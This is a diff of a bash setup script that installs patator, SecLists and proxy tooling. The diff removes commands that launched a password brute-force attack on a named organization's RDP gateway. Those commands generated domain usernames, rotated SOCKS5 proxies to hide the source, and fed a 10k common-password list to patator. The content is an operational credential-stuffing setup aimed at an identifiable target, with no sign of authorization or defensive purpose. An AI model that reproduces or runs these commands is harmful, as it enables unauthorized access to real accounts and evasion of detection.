@@ -1,3 +1,6 @@
+#!/bin/bash
+set -e
+
 apt-get update -y && apt-get install python3 python3-pip curl pkg-config python3-dev default-libmysqlclient-dev build-essential -y
 
 apt install build-essential libssl-dev zlib1g-dev \
@@ -28,7 +31,3 @@ git clone https://github.com/danielmiessler/SecLists.git
 
 pip3 install -r patator/requirements.txt --break-system-packages
 pip3 install pycurl --break-system-packages
-
-python3 brute/generator/domain.py CORP SecLists/Usernames/top-usernames-shortlist.txt
-python3 brute/proxy/server.py brute/proxy/remote_proxies.txt
-python3 patator/src/patator/patator.py rdp_gateway url=https://remote.crockett-facilities.com/remoteDesktopGateway/ user_pass=FILE0:FILE1 0=domain_usernames.txt 1=SecLists/Passwords/Common-Credentials/10k-most-common.txt proxy=FILE2 2=brute/proxy/local_proxies.txt proxy_type=socks5 -x ignore:code=401 -x ignore:fgrep='pycurl.error' --allow-ignore-failures
